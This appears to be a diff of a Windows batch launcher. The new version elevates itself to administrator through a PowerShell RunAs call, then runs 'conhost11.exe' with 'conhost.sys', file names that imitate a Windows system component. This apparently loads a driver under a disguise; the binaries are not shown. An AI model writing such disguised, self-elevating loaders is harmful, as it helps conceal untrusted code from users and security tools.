@@ -1,3 +1,19 @@
-cd %~dp0
-54gh80tfghj3480h80n3g4.exe h8034g5j0fg2344fgjk39.sys
-pause
+@echo off
+cd /d "%~dp0"
+echo.
+net session >nul 2>&1
+if %errorLevel% == 0 (
+    goto :continue
+) else (
+    goto :admin
+)
+
+:admin
+echo.
+powershell -Command "Start-Process '%0' -Verb RunAs"
+exit
+:continue
+echo.
+conhost11.exe conhost.sys
+echo.
+exit
